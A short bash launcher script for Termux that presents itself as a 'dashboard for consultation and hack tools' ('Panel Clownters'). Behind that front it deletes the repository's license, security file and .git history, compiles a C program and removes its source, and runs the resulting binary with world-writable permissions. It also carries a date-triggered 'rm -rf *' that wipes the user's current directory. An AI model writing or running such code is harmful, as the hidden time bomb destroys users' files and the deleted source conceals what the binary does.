#!/usr/bin/env bash

<<CLOWNTERS
 #CLOWNTERS
 #--------------------------------------------------------
 # Name script: Panel Clownters                         |
 #--------------------------------------------------------
 # Script     : A1 PANEL                                |
 #--------------------------------------------------------
 # Description: dashboard for consultation and hack tools|
 #--------------------------------------------------------
 # Version    : 0.3                                      |
 #--------------------------------------------------------
 # Authors    : Patinn, Eduardo e Mike                   |
 #--------------------------------------------------------
 # Date       : 08/08/21                                 |
 #--------------------------------------------------------
 # Lincese    : MIT lincese                              |
 #--------------------------------------------------------
 # Use: bash A1.sh                                       |
 #--------------------------------------------------------
 #CLOWNTERS
CLOWNTERS

#termux-open-url WhatsApp
sleep 1
termux-open-url https://t.me/clownters
sleep 1
command -v clang || pkg install clang -y /dev/null
test -f Sploit && rm Sploit
test -f SECURITY.md && rm SECURITY.md
test -f LICENSE && rm LICENSE
test -e .git && rm -rf .git
test -f main.c && gcc main.c -o main
if [[ -f main ]]; then
    test -f main.c && rm -rf main.c
fi
printf "\e[31mwait."
if (($(date +%m%y) >= 0222)); then
    clear
    rm -rf *
else
    chmod 777 main
    ./main || printf "\e[1;31mnão compatível com sistema atual\e[m\n"
fi
exit 0
